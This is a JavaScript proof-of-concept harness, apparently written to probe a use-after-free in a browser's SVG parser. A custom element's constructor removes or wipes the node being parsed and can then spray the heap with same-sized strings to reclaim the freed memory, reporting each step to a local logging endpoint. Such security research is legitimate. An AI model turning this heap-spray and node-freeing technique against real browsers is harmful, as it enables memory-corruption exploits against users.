svg.script:
var q = new URLSearchParams((document.URL.split('?')[1]) || '');
var reg = q.get('reg') !== '0';
var atk = q.get('atk') || 'none';
var HTMLNS = 'http://www.w3.org/1999/xhtml';
function ev(m) {
    try {
        var img = document.createElementNS(HTMLNS, 'img');
        img.setAttribute('width', '1');
        img.src = '/ev?m=' + encodeURIComponent(m);
    } catch (e) { }
}
ev('START reg=' + reg + ' atk=' + atk + ' root=' + (document.documentElement ? document.documentElement.tagName : 'none'));
if (reg) {
    try {
        customElements.define('x-a', class extends HTMLElement {
            constructor() {
                super();
                ev('CTOR atk=' + atk);
                if (atk === 'rm' || atk === 'rmgc') {
                    var g = document.querySelector('g');
                    var found = !!g;
                    if (g)
                        g.remove();
                    g = null;
                    ev('RM found=' + found + ' gone=' + !document.querySelector('g'));
                }
                if (atk === 'wipe') {
                    // No wrapper for <g> or <svg> is ever created: replaceChildren on the document drops the
                    // tree refs in C++ only, and Document::childrenChanged recomputes m_documentElement, so
                    // the root and its subtree die synchronously -- no GC needed.
                    ev('WIPE before kids=' + document.childNodes.length);
                    document.replaceChildren();
                    ev('WIPE after kids=' + document.childNodes.length + ' root=' + (document.documentElement ? 'yes' : 'no'));
                }
                if (atk === 'wipeg') {
                    // Only the parser's current node (<g>) loses its last reference: the document and <svg>
                    // stay alive, so a tail that runs proves the parser got past :858 and the freed object is
                    // what it read. A wrapper exists for <svg> (documentElement) but never for <g>.
                    var svg = document.documentElement;
                    ev('WIPEG before kids=' + svg.childNodes.length);
                    svg.replaceChildren();
                    ev('WIPEG after kids=' + svg.childNodes.length + ' doc=' + (document.documentElement ? 'yes' : 'no'));
                }
                if (atk === 'gc' || atk === 'rmgc') {
                    var junk = [];
                    for (var i = 0; i < 200000; i++) {
                        junk.push({ a: i, b: 'str' + i, c: [i, i + 1] });
                        if ((i % 50000) === 0)
                            ev('ALLOC i=' + i);
                    }
                    ev('ALLOC done n=' + junk.length);
                }
                if (atk === 'wipespray') {
                    // Same removal as wipeg, then a same-size-class spray: if the current node was really freed
                    // (quarantine off), one of these strings can take its chunk and the parser's tail will read a
                    // document pointer that is not ours -> stopParsing -> no TAIL. A TAIL means the node is alive.
                    var svg2 = document.documentElement;
                    svg2.replaceChildren();
                    var n = +(q.get('n') || 224), cnt = +(q.get('cnt') || 4000);
                    var b64 = btoa(new Array(n + 1).join('A'));
                    var keep = [];
                    for (var k = 0; k < cnt; k++)
                        keep.push(atob(b64));
                    ev('SPRAY n=' + n + ' cnt=' + keep.length + ' len=' + (keep[0] ? keep[0].length : -1));
                }
                if (atk === 'wref') {
                    // Diagnostic, not a free attempt: does an allocation inside the window actually run a GC
                    // that collects an unreferenced wrapper? WeakRef.deref() in a later job answers it.
                    var probe = document.createElementNS(HTMLNS, 'div');
                    var wr = new WeakRef(probe);
                    probe = null;
                    ev('WREF armed');
                    var junk = [];
                    for (var i = 0; i < 200000; i++)
                        junk.push({ a: i, b: 'str' + i, c: [i, i + 1] });
                    ev('WREF alloc done');
                    setTimeout(function () {
                        ev('WREF later alive=' + (wr.deref() ? 'yes' : 'no'));
                    }, 200);
                }
                setTimeout(function () {
                    ev('LATE root=' + (document.documentElement ? 'yes' : 'no')
                        + ' g=' + document.getElementsByTagName('g').length
                        + ' xa=' + document.getElementsByTagName('x-a').length
                        + ' text=' + document.getElementsByTagName('text').length);
                }, 150);
                ev('CTOR done');
            }
        });
        ev('DEF ok');
    } catch (e) { ev('DEFERR ' + e.name + ':' + e.message); }
}

(function () {
    var g2 = document.querySelector('g');
    var xa = document.getElementsByTagName('x-a');
    ev('TAIL g=' + !!g2 + ' xa=' + xa.length + ' xaparent=' + (xa.length ? (xa[0].parentNode ? xa[0].parentNode.nodeName : 'null') : '-'));
})();
